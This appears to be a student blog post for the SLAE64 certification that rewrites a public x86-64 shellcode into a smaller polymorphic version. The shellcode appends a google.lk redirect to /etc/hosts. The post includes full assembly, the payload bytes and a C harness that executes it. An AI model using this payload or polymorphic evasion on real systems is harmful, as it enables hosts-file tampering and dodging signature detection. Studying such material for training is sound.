Assignment #6 – Writing polymorphic shellcodes
==============================================

In this assignment I had to choose three shellcodes from [Shell Storm][shell_storm_shellcode] and write polymorphic versions of them. Bonus points if your version is smaller than the original. I chose the following:

    Linux/x86-64 - Add map in /etc/hosts file - 110 bytes by Osanda Malith Jayathissa

    $ curl -s http://shell-storm.org/shellcode/ | grep "Linux/x86-64" | shuf -n3
    <li><a href="/shellcode/files/shellcode-880.php">Linux/x86-64 - Add user and password with open,write,close - 358 bytes</a> <i>by Christophe G</i></li>
    <li><a href="/shellcode/files/shellcode-76.php">Linux/x86-64 - execve(/bin/sh, [/bin/sh], NULL) - 33 bytes</a> <i>by hophet</i></li>
    <li><a href="/shellcode/files/shellcode-879.php">Linux/x86-64 - Add user and password with echo cmd - 273 bytes</a> <i>by Christophe G</i></li>



Add map in `/etc/hosts` file - 110 bytes by [@OsandaMalith][@OsandaMalith]
--------------------------------------------------------------------------

The original shellcode can be found [here][shell_storm_shellcode_896]. I reproduce it below.

Doing a quick reverse we find this shellcode adds an entry to `/etc/hosts`, in this case `127.1.1.1 google.lk`.

    ; Title: Add map in /etc/hosts file - 110 bytes
    ; Date: 2014-10-29
    ; Platform: linux/x86_64
    ; Website: http://osandamalith.wordpress.com
    ; Author: Osanda Malith Jayathissa (@OsandaMalith)

    global _start
        section .text

    _start:
        ;open
        xor rax, rax 
        add rax, 2  ; open syscall
        xor rdi, rdi
        xor rsi, rsi
        push rsi ; 0x00 
        mov r8, 0x2f2f2f2f6374652f ; stsoh/
        mov r10, 0x7374736f682f2f2f ; /cte/
        push r10
        push r8
        add rdi, rsp
        xor rsi, rsi
        add si, 0x401
        syscall

        ;write
        xchg rax, rdi
        xor rax, rax
        add rax, 1 ; syscall for write
        jmp data

    write:
        pop rsi 
        mov dl, 19 ; length in rdx
        syscall

        ;close
        xor rax, rax
        add rax, 3
        syscall

        ;exit
        xor rax, rax
        mov al, 60
        xor rdi, rdi
        syscall 

    data:
        call write
        text db '127.1.1.1 google.lk'

My polymorphic version can be seen below. The first part was heavily altered and multiple size optimisations were introduced. The remaining parts had some instructions substituted by equivalent ones and some more optimisations (say `xor eax, eax` instead of `xor rax, rax`). In the end my polymorphic version works as the original but was cut from 110 bytes to 85. Neither the original nor my version include null bytes.

    global _start
        section .text

    _start:
        ;open
        ; rdi = *pathname
        ; rsi = 0x0401
        ; rax = 2
        push 2
        pop rax
        xor edi, edi
        push rdi                     ; null byte, terminate string
        push 0x7374736f              ; rax2 -S $(echo osts | rev)
        mov r9, 0x682f6374652f2f2f   ; rax2 -S $(echo ///etc/h | rev)
        push r9
        mov rdi, rsp
        push word 0x0401             ; O_WRONLY|O_APPEND
        pop si
        syscall

        ;write
        mov edi, eax
        xor eax, eax
        inc rax                      ; syscall for write
        jmp data

    write:
        pop rsi 
        mov dl, 19                   ; length in rdx
        syscall

        ;close
        sub eax, eax
        add eax, 3
        syscall

        ;exit
        ;xor eax, eax                ; already done by close
        add al, 60
        xor edi, edi
        syscall 

    data:
        call write
        text db '127.1.1.1 google.lk'

    
    #include <stdio.h>
    #include <string.h>

    char code[] =
    "\x6a\x02\x58\x31\xff\x57\x68\x6f\x73\x74\x73\x49\xb9\x2f\x2f\x2f\x65\x74"
    "\x63\x2f\x68\x41\x51\x48\x89\xe7\x66\x68\x01\x04\x66\x5e\x0f\x05\x89\xc7"
    "\x31\xc0\x48\xff\xc0\xeb\x12\x5e\xb2\x13\x0f\x05\x29\xc0\x83\xc0\x03\x0f"
    "\x05\x04\x3c\x31\xff\x0f\x05\xe8\xe9\xff\xff\xff\x31\x32\x37\x2e\x31\x2e"
    "\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x6c\x6b";

    int main() {
        printf("length: %lu\n", strlen(code));
        ((int(*)()) code)();
    }



[shell_storm_shellcode]: http://shell-storm.org/shellcode/
[shell_storm_shellcode_896]: http://shell-storm.org/shellcode/files/shellcode-896.php

[@OsandaMalith]: https://twitter.com/OsandaMalith

----

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert][SLAE64] certification.

Student ID: SLAE64-1635

[SLAE64]: https://www.pentesteracademy.com/course?id=7
